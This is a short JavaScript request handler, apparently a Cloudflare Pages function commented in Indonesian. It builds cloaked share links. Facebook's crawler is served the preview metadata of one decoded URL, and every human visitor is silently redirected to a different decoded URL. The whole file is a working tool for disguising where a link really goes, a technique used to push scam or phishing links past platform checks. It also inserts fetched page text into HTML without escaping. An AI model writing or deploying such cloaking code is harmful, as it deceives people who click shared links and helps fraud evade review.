export async function onRequest(context) {
  const { request, params } = context;
  const ua = request.headers.get("user-agent") || "";
  const fullPath = params.path ? params.path.join('/') : "";

  if (!fullPath || fullPath.includes("index.html")) return context.next();

  try {
    // Memecah format Base64Source.Base64Target
    const [sEnc, uEnc] = fullPath.split('.');
    if (!sEnc || !uEnc) return context.next();

    const sourceUrl = atob(sEnc.replace(/-/g, '+').replace(/_/g, '/'));
    const targetUrl = atob(uEnc.replace(/-/g, '+').replace(/_/g, '/'));

    // Khusus untuk Crawler Facebook / Bot
    if (ua.includes("facebookexternalhit") || ua.includes("Facebot")) {
      const response = await fetch(sourceUrl, {
        headers: { "User-Agent": "facebookexternalhit/1.1" }
      });
      const htmlText = await response.text();

      // Fungsi ambil Meta Tag Otomatis
      const getMeta = (prop) => {
        const reg = new RegExp(`<meta[^>]*?(?:property|name)=["'](?:og:)?${prop}["'][^>]*?content=["']([^"']*)["']`, "i");
        const match = htmlText.match(reg);
        return match ? match[1] : "";
      };

      let title = getMeta("title") || "Loading...";
      let desc = getMeta("description") || "";
      let image = getMeta("image") || "";

      // Trik Khusus YouTube agar PASTI Landscape
      if (sourceUrl.includes("youtube.com") || sourceUrl.includes("youtu.be")) {
        let vId = sourceUrl.includes("v=") ? sourceUrl.split("v=")[1].split("&")[0] : sourceUrl.split("/").pop().split("?")[0];
        image = `https://i.ytimg.com/vi/${vId}/maxresdefault.jpg`;
      }

      return new Response(`<!DOCTYPE html><html><head>
        <meta charset="UTF-8">
        <title>${title}</title>
        <meta property="og:title" content="${title}">
        <meta property="og:description" content="${desc}">
        <meta property="og:image" content="${image}">
        <meta property="og:type" content="website">
        <meta property="og:url" content="${sourceUrl}">
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:image" content="${image}">
      </head><body></body></html>`, { headers: { "content-type": "text/html;charset=UTF-8" } });
    }

    // Untuk Manusia: Langsung Redirect 302
    return Response.redirect(targetUrl, 302);
  } catch (e) {
    return context.next();
  }
}
